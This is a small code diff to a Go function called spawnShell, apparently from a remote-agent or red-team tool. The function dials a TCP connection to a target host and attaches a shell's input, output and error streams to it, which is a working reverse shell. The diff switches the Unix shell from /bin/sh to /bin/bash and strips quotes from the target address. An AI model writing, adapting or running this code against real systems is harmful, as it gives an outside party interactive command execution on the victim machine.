@@ -99,10 +99,10 @@ func spawnShell(target string, agent *util.AgentConfig) (string, int, int) {
 	case "windows":
 		executor = "powershell.exe"
 	default:
-		executor = "/bin/sh"
+		executor = "/bin/bash"
 	}
 	shell := exec.Command(executor)
-	conn, _ := net.Dial("tcp", target)
+	conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
 	shell.Stdout = conn
 	shell.Stdin = conn
 	shell.Stderr = conn
